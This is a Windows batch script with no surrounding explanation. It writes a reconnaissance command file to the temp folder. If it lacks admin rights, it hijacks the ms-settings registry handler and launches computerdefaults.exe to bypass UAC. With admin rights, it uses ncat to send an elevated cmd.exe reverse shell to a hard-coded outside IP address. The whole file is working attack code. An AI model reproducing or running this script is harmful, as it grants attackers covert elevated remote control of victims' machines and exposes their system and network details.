cd %temp%
echo systeminfo > cmds.bat & echo ipconfig /all >> cmds.bat & echo cd %systemroot%\System32 >> cmds.bat & echo color 02 >> cmds.bat & echo cls >> cmds.bat & echo cmd >> cmds.bat
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "%~dpnx0" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && start computerdefaults.exe) else (ncat.exe -e "cmd.exe /k %temp%\cmds.bat" 45.79.219.180 87)
